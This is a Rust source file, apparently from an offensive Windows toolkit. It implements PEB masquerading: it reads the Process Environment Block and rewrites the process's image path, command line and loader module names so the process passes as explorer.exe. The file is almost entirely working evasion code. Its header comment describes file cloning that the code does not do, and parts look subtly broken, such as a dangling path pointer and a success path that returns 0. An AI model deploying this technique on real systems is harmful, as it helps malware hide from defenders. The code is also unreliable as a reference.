/*
FileToClone can be a path to any file. The file does not matter, but it must exist
NewFileName is the file you want to create. It can named anything and in any dir you have permissions to create a file in
*/
use crate::bindings::{DWORD, DWORD64, PPEB, PWCHAR, PLDR_MODULE};
use core::arch::asm;
use widestring::U16String;
use widestring::ucstr::U16CStr;
use windows::Win32::Foundation::{INVALID_HANDLE_VALUE, HANDLE, CloseHandle};
use windows::Win32::Storage::FileSystem::{CreateFileW, FILE_GENERIC_READ, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_MODE};
use windows::Win32::System::WindowsProgramming::RtlInitUnicodeString;
use windows::{
    core::PCSTR,
    Win32::{
        System::{Threading::RTL_CRITICAL_SECTION, LibraryLoader::{GetModuleHandleW, GetProcAddress}, SystemInformation::GetSystemWindowsDirectoryW},
        Foundation::{BOOL, NTSTATUS},
    }, core::PCWSTR,
};

#[inline]
#[cfg(target_pointer_width = "64")]
unsafe fn __readgsqword(offset: DWORD) -> DWORD64 { // will change later
    let out: u64;
    asm!(
        "mov {}, gs:[{:e}]",
        lateout(reg) out,
        in(reg) offset,
        options(nostack, pure, readonly),
    );
    out
}

#[cfg(target_pointer_width = "64")]
unsafe fn GetPeb() -> PPEB {
    __readgsqword(0x60) as PPEB
}

/*
#[inline]
unsafe fn IsPathValidW(file_path: PWCHAR) -> BOOL {
    let h_file: HANDLE = match CreateFileW(
        PCWSTR(file_path as *const u16), 
        FILE_GENERIC_READ,
        FILE_SHARE_MODE(0),
        std::ptr::null(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        HANDLE(0)
    ) {
        Ok(handle) => handle,
        Err(err) => {
            println!("[-] Error: {:?}", err);
            return BOOL(0);
        }
    };

    if h_file == INVALID_HANDLE_VALUE || h_file.is_invalid() {
        println!("[-] Invalid handle value...");
        return BOOL(0);
    }

    CloseHandle(h_file);

    BOOL(0)
}


unsafe fn CreateWindowsObjectPathW(pBuffer: PWCHAR, path: PWCHAR, size: DWORD, does_object_exist: BOOL) -> BOOL {
    if pBuffer.is_null() {
        return BOOL(0);
    }
    
    let mut lpbuffer = vec![*pBuffer; size as usize];

    if GetSystemWindowsDirectoryW(&mut lpbuffer) == 0 {
        return BOOL(0);
    }

    let mut concatted_str = {
        let x = U16CStr::from_ptr_str(pBuffer);
        let y = U16CStr::from_ptr_str(path);

        let mut concat = U16String::new();

        concat += x;
        concat += y;
        concat
    };

    println!("[+] Path: {:?}", concatted_str.display());
    if does_object_exist == BOOL(1) {
        if IsPathValidW(concatted_str.as_mut_ptr()) == BOOL(0) {
            return BOOL(0);
        }
    }

    BOOL(1)
}
*/

pub unsafe fn MasqueradePebAsExplorerEx() -> BOOL { 
    type RTLENTERCRITICALSECTION = unsafe extern "system" fn(
        critical_section: *mut RTL_CRITICAL_SECTION
    ) -> NTSTATUS;

    type RTLLEAVECRITICALSECTION = unsafe extern "system" fn(
        critical_section: *mut RTL_CRITICAL_SECTION
    ) -> NTSTATUS;

    let wexplorer_path = "C:\\Windows\\explorer.exe".encode_utf16().chain(Some(0)).collect::<Vec<_>>().as_mut_ptr();
    let peb: PPEB = GetPeb();
    
    let module = (*(*peb).LoaderData).InMemoryOrderModuleList.Flink.sub(16) as PLDR_MODULE;

    let h_module = match GetModuleHandleW(PCWSTR("ntdll.dll".encode_utf16().chain(Some(0)).collect::<Vec<_>>().as_mut_ptr())) {
        Ok(hInstance) => hInstance,
        Err(err) => {
            println!("Error: {:?}", err);
            return BOOL(0);
        }
    };

    let RtlEnterCriticalSection: RTLENTERCRITICALSECTION = std::mem::transmute(GetProcAddress(h_module, PCSTR("RtlEnterCriticalSection\0".as_ptr())));
    let RtlLeaveCriticalSection: RTLLEAVECRITICALSECTION = std::mem::transmute(GetProcAddress(h_module, PCSTR("RtlLeaveCriticalSection\0".as_ptr())));

    /* 
    //if CreateWindowsObjectPathW(wexplorer_path.as_mut_ptr(), "\\explorer.exe\0".as_ptr() as PWCHAR, MAX_PATH * 2, BOOL(1)) == BOOL(0) {
    //    return BOOL(0);
    //}
    I manually define the path instead of dynamically getting it, it was causing problems...
    */ 


    RtlEnterCriticalSection((*peb).FastPebLock as *mut RTL_CRITICAL_SECTION);

    RtlInitUnicodeString(&mut (*(*peb).ProcessParameters).ImagePathName, PCWSTR::from_raw(wexplorer_path));
    RtlInitUnicodeString(&mut (*(*peb).ProcessParameters).CommandLine, PCWSTR::from_raw(wexplorer_path));
    RtlInitUnicodeString(&mut (*module).FullDllName, PCWSTR::from_raw(wexplorer_path));
    RtlInitUnicodeString(&mut (*module).BaseDllName, PCWSTR("Explorer.exe".encode_utf16().chain(Some(0)).collect::<Vec<_>>().as_mut_ptr()));
    
    RtlLeaveCriticalSection((*peb).FastPebLock as *mut RTL_CRITICAL_SECTION);
    BOOL(0)
}